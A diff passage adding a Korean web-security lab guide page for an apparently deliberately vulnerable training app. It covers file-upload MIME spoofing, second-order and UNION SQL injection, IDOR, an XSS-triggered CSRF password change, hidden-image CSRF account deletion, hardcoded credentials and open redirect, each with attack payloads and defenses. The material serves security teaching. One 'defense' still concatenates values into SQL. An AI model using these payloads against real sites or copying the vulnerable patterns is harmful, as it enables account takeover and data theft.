+                            변조하여 악성 파일을 이미지로 위장해 업로드합니다.<br>
+                            <small class="text-secondary"><a href="https://portswigger.net/web-security/file-upload"
+                                    target="_blank" class="text-info">PortSwigger: File Upload Vulnerabilities</a> | <a
+                                    href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
+                                    target="_blank" class="text-info">OWASP: File Upload</a></small>
+                        </p>
+                        <h6 class="text-info fw-bold mt-3">📌 취약 코드 패턴 예시</h6>
+                        <code class="d-block p-3 bg-black text-danger mb-3">// MIME 타입만 검증 (확장자 미검증!)
+List&lt;String&gt; allowedMimeTypes = Arrays.asList("image/jpeg", "image/png", "image/gif");
+validMimeType = allowedMimeTypes.contains(contentType);
+// contentType은 클라이언트가 보낸 Content-Type 헤더 값 → 수정 가능!</code>
+                        <div class="alert alert-dark font-monospace small mb-3 border border-info border-opacity-25">
+                            <span class="text-info fw-bold">공격 단계 (Burp Suite 활용):</span><br>
+                            <span class="text-info fw-bold">Step 1:</span> <a href="/post/write"
+                                class="text-info">글쓰기</a>에서 <code>shell.py</code> 또는 <code>webshell.html</code> 파일 업로드
+                            시도<br>
+                            <span class="text-info fw-bold">Step 2:</span> Burp Suite Proxy에서 요청을 가로채 Content-Type을
+                            변조:<br>
+                            <code class="d-block my-2 p-2 bg-black text-warning">Content-Disposition: form-data; name="file"; filename="shell.py"
+Content-Type: image/png   ← 원래 application/x-python을 image/png로 위조!</code>
+                            <span class="text-info fw-bold">Step 3:</span> 서버는 MIME 타입만 보고 허용 → 실제로는 .py 파일이 서버에
+                            업로드됨<br>
+                            <span class="text-info fw-bold">방어 방법 3가지:</span>
+                            <code class="d-block my-2 p-2 bg-black text-success">1. 확장자 화이트리스트: .jpg, .png, .gif만 허용
+2. Magic Byte 검사: 파일 내용의 첫 바이트 확인 (JPEG: FF D8 FF)
+3. 업로드 폴더를 웹루트 밖에 저장하여 직접 실행 차단</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Q: Register SQLi (Second-Order) -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-info" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#deepQ">
+                        Q. 회원가입 SQLi + Second-Order Injection (지연 실행 공격)
+                    </button>
+                </h2>
+                <div id="deepQ" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 회원가입 단계에서 페이로드를 DB에 저장하고, 다른 기능(로그인/정보수정)에서 저장된 페이로드가
+                            쿼리에 삽입되어 실행됩니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://portswigger.net/web-security/sql-injection/cheat-sheet"
+                                    target="_blank" class="text-info">PortSwigger: SQLi Cheat Sheet</a></small>
+                        </p>
+                        <h6 class="text-info fw-bold mt-3">📌 취약 코드 패턴 예시</h6>
+                        <code class="d-block p-3 bg-black text-danger mb-3">// 회원가입: 아이디 중복 확인에서 id가 직접 삽입
+query = "select * from members where id='" + id + "'";
+// 가입 성공 후 이름 필드도 이스케이프 없이 INSERT
+query = "insert into members(...) values('" + id + "', '" + name + "', ...)";
+
+// 나중에 로그인 -> 세션에 저장된 name이 UPDATE 쿼리에 삽입시 폭탄 실행!</code>
+                        <div class="alert alert-dark font-monospace small mb-3 border border-info border-opacity-25">
+                            <span class="text-info fw-bold">공격 시나리오:</span><br>
+                            <span class="text-info fw-bold">Step 1:</span> 회원가입 시 이름을 페이로드로 등록:<br>
+                            <code class="d-block my-2 p-2 bg-black text-warning">이름: admin', role='admin'-- </code>
+                            <span class="text-info fw-bold">Step 2:</span> 이 값이 DB에 그대로 저장됨 (이 시점에는 무해함)<br>
+                            <span class="text-info fw-bold">Step 3:</span> 나중에 프로필 수정 기능이 이 값을 쿼리에 포함하면:<br>
+                            <code class="d-block my-2 p-2 bg-black text-danger">UPDATE members SET name='admin', role='admin'-- ' WHERE id='...'
+→ 역할이 admin으로 변경됨!</code>
+                            <span class="text-secondary small">💡 1단계에서 입력 검증을 통과해도 2단계에서 실행 가능합니다. 매우 탐지하기
+                                어렵습니다.</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- R: Secret Board IDOR via URL direct access -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-info" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#deepR">
+                        R. 비밀 게시글 IDOR — 클라이언트 접근제어 우회
+                    </button>
+                </h2>
+                <div id="deepR" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 비밀 게시글(secret='y') 링크를 UI에서 숨겼지만, URL을 직접 입력하면 서버가 접근을
+                            허용하는 취약점을 탐색합니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://portswigger.net/web-security/access-control/idor" target="_blank"
+                                    class="text-info">PortSwigger: IDOR</a> | <a
+                                    href="https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html"
+                                    target="_blank" class="text-info">OWASP: IDOR 방어</a></small>
+                        </p>
+                        <h6 class="text-info fw-bold mt-3">📌 취약 코드 패턴 예시</h6>
+                        <code class="d-block p-3 bg-black text-danger mb-3">// boardList.jsp: 비밀글을 UI에서만 숨김
+if("y".equals(rs.getString("secret")) && !userId.equals(rs.getString("id"))) {
+    // 클릭 시 alert() 표시 → 그러나 URL 직접 접근은 차단하지 않음!
+    out.println("&lt;a href='javascript:alert()'&gt;비밀글&lt;/a&gt;");
+}
+
+// boardView.jsp: idx로 직접 접근 시 secret 검증 없음!
+query = "select * from insecure_board where idx=" + idx;</code>
+                        <div class="alert alert-dark font-monospace small mb-3 border border-info border-opacity-25">
+                            <span class="text-info fw-bold">공격 방법:</span><br>
+                            <code class="d-block my-2 p-2 bg-black text-warning">// 게시글 목록에서 비밀글 번호를 추측하거나 SQLi로 확인 후
+// URL 직접 접근:
+/post/7   (비밀글 idx=7이라고 추측)
+/post/3   (숫자를 순서대로 대입 — Numeric IDOR)</code>
+                            <span class="text-info fw-bold">이 앱에서 확인:</span> <a href="/post/1" class="text-info">/post/1
+                                직접 접근</a>해 보세요. 로그인하지 않아도 내용이 보이면 IDOR 취약점입니다.<br>
+                            <span class="text-info fw-bold">방어:</span>
+                            <code class="d-block my-2 p-2 bg-black text-success">// ✅ boardView에서 secret 검증 추가 필수
+if("y".equals(secret) && !userId.equals(postOwner) && !"admin".equals(userId)) {
+    return forbidden();  // 서버에서 명시적 차단
+}</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- S: XSS + CSRF Chained Attack -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-info" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#deepS">
+                        S. 체인 공격 — XSS + CSRF 연계로 비밀번호 강제 변경
+                    </button>
+                </h2>
+                <div id="deepS" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> XSS로 피해자의 브라우저에서 CSRF 공격 코드를 실행시켜, 피해자 모르게 비밀번호를 변경하는 연계
+                            공격 체인을 구성합니다.<br>
+                            <small class="text-secondary"><a href="https://portswigger.net/web-security/csrf"
+                                    target="_blank" class="text-info">PortSwigger: CSRF</a> | <a
+                                    href="https://portswigger.net/web-security/cross-site-scripting#xss-into-html"
+                                    target="_blank" class="text-info">PortSwigger: XSS</a></small>
+                        </p>
+                        <h6 class="text-info fw-bold mt-3">연계 공격 흐름도</h6>
+                        <code class="d-block p-3 bg-black text-info mb-3">공격자                              피해자 브라우저
+   │                                     │
+   ├─ 게시글에 XSS 페이로드 삽입          │
+   │  &lt;img src=x onerror="             │
+   │    fetch('/change_pw?new_pw=hacked')│
+   │  "&gt;                              │
+   │                                     │
+   │                           피해자가 게시글 열람
+   │                                     │
+   │                       onerror 이벤트 발동
+   │                                     │
+   │                  /change_pw?new_pw=hacked 요청 자동 전송
+   │                  (피해자의 세션 쿠키가 자동 포함!)
+   │                                     │
+   │                        비밀번호가 "hacked"로 변경됨
+   │                                     ↓</code>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-info border-opacity-25">
+                            <span class="text-info fw-bold">이 앱에서 실습:</span><br>
+                            <span class="text-info fw-bold">Step 1:</span> <a href="/post/write" class="text-info">게시글
+                                쓰기</a>에서 내용에 입력:<br>
+                            <code
+                                class="d-block my-2 p-2 bg-black text-warning">&lt;img src=x onerror="fetch('/change_pw?new_pw=hacked123')"&gt;</code>
+                            <span class="text-info fw-bold">Step 2:</span> 다른 브라우저(피해자로 의)에서 해당 게시글을 열면 → 자동으로 비밀번호 변경
+                            요청 발생<br>
+                            <span class="text-info fw-bold">Step 3:</span> <a href="/change_pw" class="text-info">암호 변경
+                                페이지</a>에서 직접 GET 요청도 수락하는지 확인<br>
+                            <span class="text-secondary small">💡 이중 방어가 필요합니다: XSS 방어(이스케이프) AND CSRF 방어(토큰). 하나만으론
+                                부족합니다.</span>
+                        </div>
+                    </div>
+                </div>
+            </div><!-- closes accordion-item S -->
+        </div><!-- closes deepAccordion -->
+    </div><!-- closes card-body -->
+</div><!-- closes section-deep card -->
+
+<!-- Final Advanced Scenarios -->
+<div class="card shadow-lg rounded-4 mb-5 mt-4 section-final">
+            <div class="card-header py-4 px-4 d-flex align-items-center gap-3">
+                <i class="bi bi-fire fs-3" style="color:var(--c-purple)"></i>
+                <div>
+                    <h4 class="mb-0 fw-bold" style="color:var(--c-purple)">🔥 실전 침투 테스트 핵심 시나리오</h4>
+                    <small class="text-muted">하드코딩 자격증명 · 게시글 수정 IDOR · 마이페이지 파라미터 변조 · 탈퇴 CSRF · Open Redirect</small>
+                </div>
+            </div>
+            <div class="card-body p-4 p-md-5">
+                <div class="accordion" id="finalAccordion">
+
+                    <!-- T: Hardcoded Credentials -->
+                    <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                        <h2 class="accordion-header">
+                            <button class="accordion-button collapsed fw-bold fs-5 text-danger" type="button"
+                                data-bs-toggle="collapse" data-bs-target="#finalT">
+                                T. 하드코딩된 인증 정보 (Default/Hardcoded Credentials)
+                            </button>
+                        </h2>
+                        <div id="finalT" class="accordion-collapse collapse">
+                            <div class="accordion-body bg-body">
+                                <p class="mb-2"><strong>실습 목표:</strong> 개발 과정에서 하드코딩된 관리자 계정 정보를 소스코드 유출이나 사전
+                                    대입(Dictionary Attack)을 통해 알아냅니다.<br>
+                                    <small class="text-secondary"><a
+                                            href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"
+                                            target="_blank" class="text-info">OWASP: Authentication Failures</a></small>
+                                </p>
+                                <h6 class="text-danger fw-bold mt-3">📌 취약 코드 패턴 예시</h6>
+                                <code class="d-block p-3 bg-black text-danger mb-3">// DB 조회 없이 소스코드에 관리자 계정이 하드코딩됨
+if(id == "admin" && password =="admin123") {
+    session.setAttribute("id", "admin");
+    out.println("&lt;script&gt;location.href='main.jsp';&lt;/script&gt;");
+}</code>
+                                <div
+                                    class="alert alert-dark font-monospace small mb-3 border border-danger border-opacity-25">
+                                    <span class="text-danger fw-bold">공격 방법:</span> 깃허브 검색, 디렉터리 리스팅, 백업 파일(.bak) 다운로드
+                                    등을 이용해 소스코드를 확보하거나 <code>admin / admin123</code>, <code>root / root</code> 등 기본 계정
+                                    사전을 대입합니다.<br>
+                                    <span class="text-secondary small">💡 예방: 모든 인증 정보는 DB나 환경 변수(Secrets Manager 등)에서
+                                        안전하게 관리해야 합니다.</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- U: Edit Post IDOR -->
+                    <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                        <h2 class="accordion-header">
+                            <button class="accordion-button collapsed fw-bold fs-5 text-danger" type="button"
+                                data-bs-toggle="collapse" data-bs-target="#finalU">
+                                U. 게시글 수정 권한 우회 (IDOR on Update)
+                            </button>
+                        </h2>
+                        <div id="finalU" class="accordion-collapse collapse">
+                            <div class="accordion-body bg-body">
+                                <p class="mb-2"><strong>실습 목표:</strong> 타인의 게시글을 수정할 때, 서버가 "현재 로그인한 사용자가 해당 게시물의
+                                    작성자인가?"를 검증하지 않는 점을 노립니다.<br>
+                                    <small class="text-secondary"><a
+                                            href="https://portswigger.net/web-security/access-control/idor"
+                                            target="_blank" class="text-info">PortSwigger: IDOR</a></small>
+                                </p>
+                                <h6 class="text-danger fw-bold mt-3">📌 취약 코드 패턴 예시</h6>
+                                <code class="d-block p-3 bg-black text-danger mb-3">// boardUpdate.jsp (수정 폼 접근 시)
+query = "select * from insecure_board where idx="+idx;
+// ⚠️ 소유자(userId) 검증 누락!
+
+// boardAction.jsp (실제 수정 처리 시)
+query = "update insecure_board set title='"+title+"', content='"+content+"' where idx="+idx;
+// ⚠️ 역시 소유자(userId) 검증 누락!</code>
+                                <div
+                                    class="alert alert-dark font-monospace small mb-3 border border-danger border-opacity-25">
+                                    <span class="text-danger fw-bold">공격 방법:</span><br>
+                                    1. 내 게시판 글의 수정 페이지로 진입 (예: <code>boardUpdate.jsp?idx=5</code>)<br>
+                                    2. URL 파라미터를 타인의 글 번호로 변조 (예: <code>boardUpdate.jsp?idx=1</code>)<br>
+                                    3. 서버 검증이 없으므로 남의 글이 수정 폼에 열림<br>
+                                    4. 내용 수정 후 "Update" 버튼을 누르면 타인의 글 내용이 덮어씌워짐!<br>
+                                    <span class="text-success fw-bold">방어 예시:</span><br>
+                                    <code
+                                        class="d-block my-2 p-2 bg-black text-success">query = "update insecure_board set title=?, content=? where idx=? AND id=?"; // AND id=? 추가!</code>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- V: Mypage Parameter Tampering -->
+                    <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                        <h2 class="accordion-header">
+                            <button class="button collapsed fw-bold fs-5 text-danger accordion-button" type="button"
+                                data-bs-toggle="collapse" data-bs-target="#finalV">
+                                V. 개인정보 조회 파라미터 변조 (MyPage IDOR/SQLi)
+                            </button>
+                        </h2>
+                        <div id="finalV" class="accordion-collapse collapse">
+                            <div class="accordion-body bg-body">
+                                <p class="mb-2"><strong>실습 목표:</strong> 마이페이지처럼 세션 정보만으로 충분한 기능에서, 서버가 불필요하게 클라이언트의
+                                    파라미터를 신뢰하여 타인의 정보를 노출하는 설계를 분석합니다.<br>
+                                    <small class="text-secondary"><a
+                                            href="https://portswigger.net/web-security/access-control/idor"
+                                            target="_blank" class="text-info">PortSwigger: IDOR</a></small>
+                                </p>
+                                <h6 class="text-danger fw-bold mt-3">📌 취약 코드 패턴 예시</h6>
+                                <code class="d-block p-3 bg-black text-danger mb-3">// 세션에서 회원 ID를 가져오지 않고, GET 파라미터를 그대로 사용!
+String id = request.getParameter("id");
+query = "select * from members where id='"+id+"'";</code>
+                                <div
+                                    class="alert alert-dark font-monospace small mb-3 border border-danger border-opacity-25">
+                                    <span class="text-danger fw-bold">위험성:</span><br>
+                                    1. URL에 ID가 노출됨: <code>mypage.jsp?id=alice</code><br>
+                                    2. <strong>IDOR 공격:</strong> <code>mypage.jsp?id=admin</code> 으로 바꾸면 관리자 개인정보가
+                                    표시됨.<br>
+                                    3. <strong>SQLi 공격:</strong> <code>mypage.jsp?id=admin' UNION SELECT 1,2,3-- </code>
+                                    와 같이 정보 추출 가능.<br>
+                                    <span class="text-success fw-bold">방어 설계:</span><br>
+                                    <code class="d-block my-2 p-2 bg-black text-success">// ✅ 파라미터(Parameter)를 믿지 말고 세션(Session)을 완전히 신뢰할 것
+String userId = (String)session.getAttribute("id");
+query = "select * from members where id='"+userId+"'";</code>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- W: Withdrawal CSRF -->
+                    <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                        <h2 class="accordion-header">
+                            <button class="accordion-button collapsed fw-bold fs-5 text-danger" type="button"
+                                data-bs-toggle="collapse" data-bs-target="#finalW">
+                                W. 회원 탈퇴 CSRF (크로스 사이트 요청 위조)
+                            </button>
+                        </h2>
+                        <div id="finalW" class="accordion-collapse collapse">
+                            <div class="accordion-body bg-body">
+                                <p class="mb-2"><strong>실습 목표:</strong> 비밀번호 재확인 절차 없는 중요한 상태 변경 기능(회원탈퇴)이 CSRF 공격에 얼마나
+                                    취약한지 확인합니다.<br>
+                                    <small class="text-secondary"><a href="https://portswigger.net/web-security/csrf"
+                                            target="_blank" class="text-info">PortSwigger: CSRF</a></small>
+                                </p>
+                                <h6 class="text-danger fw-bold mt-3">📌 취약 코드 패턴 예시</h6>
+                                <code class="d-block p-3 bg-black text-danger mb-3">// 마이페이지에서 탈퇴버튼 클릭 -> GET 방식 단순 페이지 이동으로 처리
+// withdrawal.jsp (탈퇴 처리)
+String id = (String)session.getAttribute("id");
+query = "delete from members where id='"+id+"'";
+stmt.executeUpdate(query);
+session.invalidate(); // 계정 즉시 삭제 및 로그아웃</code>
+                                <div
+                                    class="alert alert-dark font-monospace small mb-3 border border-danger border-opacity-25">
+                                    <span class="text-danger fw-bold">공격 시나리오:</span><br>
+                                    1. 중요 기능(탈퇴)이 단일 GET/POST 요청만으로 즉시 수행되며, CSRF 토큰이나 비밀번호 확인 등 추가 방어막이 없습니다.<br>
+                                    2. 공격자가 포럼 게시판에 아래 XSS/HTML을 삽입:<br>
+                                    <code
+                                        class="d-block my-2 p-2 bg-black text-warning">&lt;img src="http://사이트/withdrawal.jsp" style="display:none"&gt;</code>
+                                    3. 사이트에 로그인한 상태의 다른 사용자가 해당 게시물을 보는 순간 <code>withdrawal.jsp</code>가 몰래 로드됩니다.<br>
+                                    4. 브라우저는 사용자의 세션 쿠키를 함께 전송하므로, <strong>피해자도 모르게 회원 탈퇴</strong>가 완료됩니다.<br>
+                                    <span class="text-secondary small">💡 예방 3요소: POST 메서드 사용, CSRF Anti-Token 추가, 탈퇴 전
+                                        비밀번호 재입력 폼 구현</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- X: Open Redirect (URL 접근제어 응용) -->
+                    <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                        <h2 class="accordion-header">
+                            <button class="accordion-button collapsed fw-bold fs-5 text-danger" type="button"
+                                data-bs-toggle="collapse" data-bs-target="#finalX">
+                                X. Open Redirect (오픈 리다이렉트) — 피싱의 핵심 도구
+                            </button>
+                        </h2>
+                        <div id="finalX" class="accordion-collapse collapse">
+                            <div class="accordion-body bg-body">
+                                <p class="mb-2"><strong>실습 목표:</strong> 로그인 리다이렉션 또는 페이지 이동 파라미터가 검증되지 않아 피싱 사이트로 조작되는
+                                    원리를 배웁니다.<br>
+                                    <small class="text-secondary"><a href="https://portswigger.net/web-security/ssrf"
+                                            target="_blank" class="text-info">PortSwigger: Open Redirection (SSRF
+                                            관련)</a> | <a
+                                            href="https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"
+                                            target="_blank" class="text-info">OWASP</a></small>
+                                </p>
+                                <h6 class="text-danger fw-bold mt-3">📚 책 패턴 연계 시나리오 (login + url_example)</h6>
+                                <code class="d-block p-3 bg-black text-danger mb-3">// url_example 에서의 리다이렉션 패턴
+String taskPage = request.getParameter("taskPage");
+out.println("&lt;script&gt;location.href='index.jsp?taskPage=" + taskPage + "';&lt;/script&gt;");
+
+// 취약점: taskPage에 "http://evil.com" 등을 주입 가능!</code>
+                                <div
+                                    class="alert alert-dark font-monospace small mb-3 border border-danger border-opacity-25">
+                                    <span class="text-danger fw-bold">피싱 공격 흐름:</span><br>
+                                    1. 공격자가 신뢰할 수 있는 도메인의 URL을 생성:
+                                    <code>http://정상사이트/login?redirect=http://가짜사이트.com/login</code><br>
+                                    2. 피해자는 이메일이나 메신저로 받은 링크가 "정상 사이트" 도메인이기 때문에 의심 없이 클릭합니다.<br>
+                                    3. 정상 사이트에서 로그인 시, 코드가 <code>redirect</code> 파라미터를 그대로 읽어 <code>가짜사이트.com</code>으로
+                                    브라우저를 이동시킵니다.<br>
+                                    4. 가짜 사이트(똑같이 생긴 피싱 사이트)에서 세션이 만료되었다며 재로그인을 유도하여 계정을 탈취합니다.<br>
+                                    <span class="text-success fw-bold">방어:</span> 타 도메인으로의 리다이렉트는 원칙적으로 금지(URL 시작이
+                                    <code>/</code>인지 확인)하거나, 화이트리스트 검증 로직이 필요합니다.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div><!-- /finalAccordion -->
+            </div>
+        </div><!-- /deepAccordion -->
+    </div>
+</div>
+
+
+</div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+    // 카테고리별 키워드 매핑 (직접 하드코딩된 아코디언들을 키워드로 묶어 필터링 구현)
+    const categoryKeywords = {
+        'sqli': ['SQL', '인젝션', 'Injection'],
+        'xss': ['XSS', '크로스', '스크립팅'],
+        'auth': ['인증', '세션', '쿠키', 'JWT', '권한', 'IDOR', '탈취'],
+        'file': ['파일', '업로드', 'Web Shell', 'LFI', 'Traversal', '경로'],
+        'inject': ['Command', '커맨드', '명령어', 'Injection'],
+        'adv': ['CSRF', 'SSRF', '오픈', '리다이렉트', '심화', 'Open', 'Redirect', '파라미터 변조']
+    };
+
+    function filterVuln(category, btnElement) {
+        // 활성화 버튼 스타일 변경
+        document.querySelectorAll('.vuln-tabs .btn-tab').forEach(btn => btn.classList.remove('active'));
+        btnElement.classList.add('active');
+
+        const accordions = document.querySelectorAll('.accordion-item');
+        let visibleCount = 0;
+
+        accordions.forEach(item => {
+            const title = item.querySelector('.accordion-button').innerText;
+            
+            if (category === 'all') {
+                item.style.display = 'block';
+                visibleCount++;
+                return;
+            }
+
+            // 해당 카테고리의 키워드가 제목에 포함되어 있는지 확인
+            const keywords = categoryKeywords[category] || [];
+            const isMatch = keywords.some(kw => title.toLowerCase().includes(kw.toLowerCase()));
+            
+            // 또는 특별히 분류가 모호한 고급 기법 매칭
+            let isAdvFallBack = false;
+            if (category === 'adv') {
+                const isAnyOther = Object.keys(categoryKeywords)
+                    .filter(k => k !== 'adv')
+                    .some(k => categoryKeywords[k].some(kw => title.toLowerCase().includes(kw.toLowerCase())));
+                if (!isAnyOther) isAdvFallBack = true;
+            }
+
+            if (isMatch || isAdvFallBack) {
+                item.style.display = 'block';
+                visibleCount++;
+            } else {
+                item.style.display = 'none';
+            }
+        });
+
+        // 닫혀있던 아코디언들은 모두 접어주기
+        document.querySelectorAll('.accordion-collapse.show').forEach(el => {
+            const bsCollapse = bootstrap.Collapse.getInstance(el);
+            if(bsCollapse) bsCollapse.hide();
+        });
+    }
+
+    // 간단한 실습 진행도 체커 (체크박스를 동적으로 추가하여 localStorage 에 연동)
+    document.addEventListener("DOMContentLoaded", () => {
+        const accordions = document.querySelectorAll('.accordion-item');
+        const progressLabel = document.getElementById('progressLabel');
+        const progressBar = document.getElementById('progressBar');
+        
+        // localStorage 에서 완료된 항목 로드
+        let completed = JSON.parse(localStorage.getItem('vulnProgress') || '[]');
+
+        accordions.forEach((item, index) => {
+            const header = item.querySelector('.accordion-header');
+            const targetId = item.querySelector('.accordion-button').getAttribute('data-bs-target');
+            
+            // 완료 토글 버튼 추가
+            const checkBtn = document.createElement('button');
+            const isDone = completed.includes(targetId);
+            
+            checkBtn.className = `btn btn-sm ${isDone ? 'btn-success' : 'btn-outline-secondary'} ms-2`;
+            checkBtn.style.zIndex = '10';
+            checkBtn.style.position = 'absolute';
+            checkBtn.style.right = '50px';
+            checkBtn.style.top = '12px';
+            checkBtn.innerHTML = isDone ? '<i class="bi bi-check-circle-fill"></i> 완료' : '<i class="bi bi-circle"></i> 대기';
+            
+            checkBtn.onclick = (e) => {
+                e.stopPropagation(); // 아코디언 열림 방지
+                const currentlyDone = completed.includes(targetId);
+                if (currentlyDone) {
+                    completed = completed.filter(id => id !== targetId);
+                    checkBtn.className = 'btn btn-sm btn-outline-secondary ms-2';
+                    checkBtn.innerHTML = '<i class="bi bi-circle"></i> 대기';
+                } else {
+                    completed.push(targetId);
+                    checkBtn.className = 'btn btn-sm btn-success ms-2';
+                    checkBtn.innerHTML = '<i class="bi bi-check-circle-fill"></i> 완료';
+                }
+                localStorage.setItem('vulnProgress', JSON.stringify(completed));
+                updateProgress();
+            };
+            
+            header.style.position = 'relative';
+            header.appendChild(checkBtn);
+        });
+
+        function updateProgress() {
+            const total = accordions.length;
+            const done = completed.length;
+            const percent = Math.round((done / total) * 100);
+            
+            progressLabel.innerText = `${done} / ${total} 완료`;
+            progressLabel.classList.add('text-success');
+            progressBar.style.width = `${percent}%`;
+            progressBar.className = `progress-bar bg-success ${percent === 100 ? 'progress-bar-striped progress-bar-animated' : ''}`;
+        }
+        
+        updateProgress();
+    });
+</script>
+{% endblock %}
